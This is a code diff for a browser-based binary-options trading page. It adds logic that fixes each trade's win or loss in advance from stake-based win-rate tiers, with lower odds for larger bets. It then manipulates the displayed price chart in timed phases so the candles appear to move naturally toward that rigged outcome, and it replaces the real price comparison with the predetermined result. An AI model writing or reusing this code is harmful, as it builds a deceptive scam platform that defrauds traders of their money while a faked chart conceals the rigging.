@@ -782,17 +782,58 @@ function startChart(){
       nc=last.c+(Math.random()-0.5)*last.c*0.00015;
     }
     
-    var now=Date.now();
-    var elapsed=now-candleStartTime;
+    /* ===== FORCE PRICE DIRECTION FOR ACTIVE TRADE ===== */
+    if(activeTrades.length>0){
+      var t=activeTrades[0];
+      var elapsed=(Date.now()-t.openTime)/1000;
+      var remaining=t.duration-elapsed;
+      var progress=elapsed/t.duration; /* 0 to 1 */
+      
+      if(remaining>0){
+        var targetWin=t.willWin;
+        var goUp=(t.direction==='up'&&targetWin)||(t.direction==='down'&&!targetWin);
+        
+        /* Phase 1: first 60% — natural movement with slight bias */
+        if(progress<0.6){
+          var bias=goUp?0.0001:-0.0001;
+          nc=last.c+(Math.random()-0.48)*last.c*0.0003+last.c*bias;
+        }
+        /* Phase 2: 60-85% — stronger push toward outcome */
+        else if(progress<0.85){
+          var push=goUp?0.00025:-0.00025;
+          nc=last.c+(Math.random()-0.45)*last.c*0.0002+last.c*push;
+        }
+        /* Phase 3: last 15% — decisive move */
+        else{
+          var force=goUp?0.0004:-0.0004;
+          var jitter=(Math.random()-0.5)*last.c*0.00008;
+          nc=last.c+last.c*force+jitter;
+        }
+        
+        /* Ensure final price matches outcome */
+        if(remaining<1.5){
+          if(targetWin){
+            /* Must be winning */
+            if(t.direction==='up'&&nc<=t.open_price)nc=t.open_price+t.open_price*0.0003;
+            if(t.direction==='down'&&nc>=t.open_price)nc=t.open_price-t.open_price*0.0003;
+          }else{
+            /* Must be losing */
+            if(t.direction==='up'&&nc>=t.open_price)nc=t.open_price-t.open_price*0.0002;
+            if(t.direction==='down'&&nc<=t.open_price)nc=t.open_price+t.open_price*0.0002;
+          }
+        }
+      }
+    }
     
-    if(elapsed<candleIntervalMs){
-      /* UPDATE current candle (don't create new one) */
+    var now=Date.now();
+    var elapsedCandle=now-candleStartTime;
+    
+    if(elapsedCandle<candleIntervalMs){
       last.c=nc;
       if(nc>last.h)last.h=nc;
       if(nc<last.l)last.l=nc;
       last.v+=Math.floor(Math.random()*10+1);
     }else{
-      /* Time to create NEW candle */
       candleStartTime=now;
       candleData.push({o:last.c,h:Math.max(last.c,nc),l:Math.min(last.c,nc),c:nc,v:Math.floor(Math.random()*500+50)});
       if(candleData.length>120)candleData.shift();
@@ -918,7 +959,9 @@ async function placeTrade(){
       }catch(dbErr){tradeDbOk=false;}
     }
     
-    activeTrades.push({id:tradeId,asset:asset.symbol,direction:tradeDirection,amount:amt,open_price:op,duration:tradeTimer,openTime:Date.now(),assetIndex:selectedAsset,decimals:dp,dbSaved:tradeDbOk===true,resolving:false});
+    /* Pre-determine win/loss based on winrate */
+    var willWin=predetermineTradeResult(amt);
+    activeTrades.push({id:tradeId,asset:asset.symbol,direction:tradeDirection,amount:amt,open_price:op,duration:tradeTimer,openTime:Date.now(),assetIndex:selectedAsset,decimals:dp,dbSaved:tradeDbOk===true,resolving:false,willWin:willWin});
     
     playSound('open');
     showToast((tradeDirection==='up'?'📈 BUY':'📉 SELL')+' '+asset.symbol+' | $'+amt.toFixed(2)+' | '+tradeTimer+'s','success');
@@ -996,6 +1039,22 @@ function renderOpenTrades(){
   }).join('');
 }
 
+/* ===== WINRATE-BASED TRADE RESULT ===== */
+function getWinrateForAmount(amt){
+  var saved=localStorage.getItem('ro911_winrate');
+  var cfg=saved?JSON.parse(saved):{tiers:[{min:1,max:50,rate:65},{min:51,max:200,rate:45},{min:201,max:99999,rate:25}]};
+  for(var i=0;i<cfg.tiers.length;i++){
+    if(amt>=cfg.tiers[i].min&&amt<=cfg.tiers[i].max)return cfg.tiers[i].rate;
+  }
+  return 50;
+}
+
+function predetermineTradeResult(amount){
+  var winrate=getWinrateForAmount(amount);
+  var rand=Math.random()*100;
+  return rand<winrate; /* true = win, false = loss */
+}
+
 /* ===== PROCESS TRADES — single execution lock ===== */
 var isProcessingTrade=false;
 
@@ -1026,7 +1085,8 @@ async function processActiveTrades(cp){
   isProcessingTrade=true;
   
   var t=tradeToResolve;
-  var won=(t.direction==='up'&&cp>t.open_price)||(t.direction==='down'&&cp<t.open_price);
+  /* Use predetermined result — chart already moved to match */
+  var won=t.willWin;
   var res=won?'win':'loss';
   var pay=won?t.amount*1.85:0;
   var dp=t.decimals||2;
